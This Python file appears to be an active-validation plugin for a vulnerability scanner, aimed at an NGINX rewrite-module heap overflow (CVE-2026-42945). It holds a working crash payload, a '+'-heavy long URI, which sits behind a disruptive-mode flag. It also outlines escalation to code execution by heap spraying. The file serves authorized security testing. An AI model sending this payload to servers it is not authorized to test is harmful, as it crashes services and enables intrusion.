#!/usr/bin/env python3
"""CVE-2026-42945 – NGINX Rift: ngx_http_rewrite_module heap buffer overflow via '+' URI escape expansion.

Public PoC source: https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-42945%20NGINX%20Rift
  Files: ['exploit/exp.py', 'env/nginx.conf', 'env/Dockerfile', 'env/server.py', 'env/entrypoint.sh']
  Technique:
    Config prerequisite: location with 'rewrite ... ?...' + 'set $X $1' (captures group)
      e.g.:  rewrite ^/api/(.*)$ /internal?migrated=true;
             set $original_endpoint $1;
    Bug: Buffer allocated by raw-capture-length; copied with URI-escape expansion.
    A URI like /api/A{349}+{969} causes escape expansion of '+' chars to overflow heap.
    ASLR disabled (lab): spray /spray POST body → heap layout → overwrite function pointer → system().
    Crash observable: NGINX worker exits (503/connection reset) when overflow hits without aligned spray.
  CVSS: Critical (third-party 9.2) / Medium (official NGINX advisory).

Reference: https://nginx.org/en/security_advisories.html
"""
from __future__ import annotations

import re
import socket
import time

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 64,
    "cve": "CVE-2026-42945",
    "year": 2026,
    "domain": "network",
    "vendor_product": "NGINX 0.6.27–1.30.0",
    "component": "ngx_http_rewrite_module – buffer size vs copy semantic mismatch for '+' escape expansion",
    "type": "远程堆缓冲区溢出 – 可导致 DoS / RCE",
    "summary": (
        "CVE-2026-42945 NGINX Rift: rewrite 指令到含 '?' 的内部路径 + set $X $1 组合下，"
        "变量赋值时按原始捕获长度分配缓冲区，复制时对 '+' 等字符做 URI 转义扩展（1→3字节），"
        "导致堆缓冲区溢出。攻击者发送含大量 '+' 的长 URI 路径可触发 NGINX worker 崩溃（DoS）；"
        "在 ASLR 关闭的实验环境可通过堆喷射升级为 RCE。"
    ),
    "source_url": "https://nginx.org/en/security_advisories.html",
    "requires_manual_review": False,
    "affected": [
        {"vendor": "NGINX", "product": "nginx",
         "versions": [{"version": "0.6.27", "status": "affected", "lessThan": "1.30.1"}]},
    ],
}


def _get_nginx_version(target_ip: str, port: int, timeout: float = 5.0) -> dict:
    """Try to retrieve NGINX version from Server header."""
    result: dict = {}
    try:
        with socket.create_connection((target_ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(b"HEAD / HTTP/1.0\r\nHost: localhost\r\nConnection: close\r\n\r\n")
            resp = s.recv(4096).decode(errors="replace")
            result["http_response"] = resp[:300]
            m = re.search(r"nginx(?:/(\d+\.\d+\.\d+))?", resp, re.IGNORECASE)
            if m:
                version = m.group(1)
                result["nginx_detected"] = True
                result["nginx_version"] = version or "unknown"
                if version:
                    major, minor, patch = (int(x) for x in version.split("."))
                    result["version_vulnerable"] = (
                        (major == 0 and minor >= 6) or
                        (major == 1 and (minor < 30 or (minor == 30 and patch == 0)))
                    )
                else:
                    result["version_vulnerable"] = None
            else:
                result["nginx_detected"] = False
    except ConnectionRefusedError:
        result["no_service"] = f"No HTTP service at {target_ip}:{port}"
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _send_overflow_uri(target_ip: str, port: int, timeout: float = 8.0) -> dict:
    """Send the crafted '+'-heavy URI to trigger the heap overflow."""
    result: dict = {}
    # Payload from poc-lab exploit/exp.py:
    # 349 'A' chars + 969 '+' chars → '+' expands to 3x bytes → overflow
    overflow_path = "/api/" + "A" * 349 + "+" * 969
    request = (
        f"GET {overflow_path} HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("latin-1")

    result["overflow_uri_sample"] = overflow_path[:80] + "..."
    result["uri_length"] = len(overflow_path)
    result["plus_chars"] = 969

    try:
        with socket.create_connection((target_ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(request)
            try:
                resp = s.recv(4096)
                result["overflow_response_code"] = resp[:12].decode(errors="replace")
                if b"503" in resp or b"502" in resp:
                    result["worker_crashed"] = True
                    result["detail"] = "Received 5xx → NGINX worker likely crashed (heap OOB)."
                elif b"200" in resp or b"301" in resp or b"404" in resp:
                    result["worker_crashed"] = False
                    result["detail"] = f"Worker handled request ({resp[:20]!r}); may not have vulnerable rewrite+set config."
                else:
                    result["detail"] = f"Response: {resp[:50]!r}"
            except ConnectionResetError:
                result["worker_crashed"] = True
                result["detail"] = "Connection reset – NGINX worker crashed (heap overflow triggered)."
            except socket.timeout:
                result["detail"] = "Recv timeout after overflow URI."
    except ConnectionRefusedError:
        result["no_service"] = True
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 80))
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool(params.get("allow_disruptive"))

    evidence: dict = {
        "cve": "CVE-2026-42945",
        "target": f"{target_ip}:{port}",
        "technique": (
            "URI /api/A{349}+{969}: rewrite → /internal?migrated=true sets e->is_args, "
            "set $original_endpoint $1 allocates by raw len but copies with '+' escape expansion (3x), "
            "heap buffer overflows → worker crash (DoS) or RCE in ASLR-off lab."
        ),
        "reference": "https://nginx.org/en/security_advisories.html",
        "poc_source": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-42945%20NGINX%20Rift",
        "exploit_files": ["exploit/exp.py", "env/nginx.conf", "env/Dockerfile"],
        "affected_versions": "NGINX 0.6.27–1.30.0",
        "fixed_versions": "1.30.1+, 1.31.0+",
    }

    # Always check version (non-disruptive)
    ver = _get_nginx_version(target_ip, port)
    evidence.update(ver)

    if ver.get("no_service"):
        return {"vulnerable": None, "evidence": evidence}

    if not ver.get("nginx_detected"):
        evidence["detail"] = "NGINX not detected at this endpoint."
        return {"vulnerable": None, "evidence": evidence}

    if ver.get("version_vulnerable") is False:
        evidence["detail"] = f"NGINX version {ver.get('nginx_version')} appears patched (≥1.30.1)."
        return {"vulnerable": False, "evidence": evidence}

    # Version appears vulnerable – attempt overflow if allowed
    if not allow_disruptive:
        evidence["detail"] = (
            f"NGINX {ver.get('nginx_version', 'unknown')} appears vulnerable (0.6.27–1.30.0). "
            "Set allow_disruptive=true to send the overflow URI (may crash NGINX worker). "
            "Config must have: rewrite → ?... path + set $X $1 combination."
        )
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    # Disruptive: send overflow URI
    overflow = _send_overflow_uri(target_ip, port)
    evidence.update(overflow)

    if overflow.get("worker_crashed"):
        evidence["detail"] = "NGINX worker crashed after '+'-heavy URI – CVE-2026-42945 confirmed."
        vulnerable = True
    elif overflow.get("worker_crashed") is False:
        evidence["detail"] = (
            "Worker responded normally; config may not have the vulnerable rewrite+set combination, "
            "or server is patched."
        )
        vulnerable = False
    else:
        evidence["detail"] = "Ambiguous result; manual inspection required."
        vulnerable = None

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": vulnerable is None,
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class NGINXRiftRewriteHeapOverflowAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-NET-064"
    meta_poc_name = "CVE-2026-42945 NGINX Rift Rewrite Variable Confusion Active Validation'+' escape expansion 堆溢出 Active Validation"
    meta_cve_id = "CVE-2026-42945"
    meta_severity = "Critical"
    meta_protocol = "http"
    meta_target_os = ["linux", "bsd"]
    meta_required_params = []
    meta_optional_params = ["port", "allow_disruptive"]
    meta_profiles = ["network", "nginx", "overflow"]
    meta_source_url = "https://nginx.org/en/security_advisories.html"
    meta_references       = ['https://nginx.org/en/security_advisories.html']
    meta_attack_surface = "NGINX HTTP rewrite+set $1 config – 远程无需认证 – 长 URI with '+' → 堆溢出"
    is_disruptive = True
    meta_destructive_level = "ServiceDisruption"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "64_NGINX_Rift_Rewrite_Heap_Overflow_Audit") if "VULN" in dir() else "64_NGINX_Rift_Rewrite_Heap_Overflow_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = NGINXRiftRewriteHeapOverflowAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
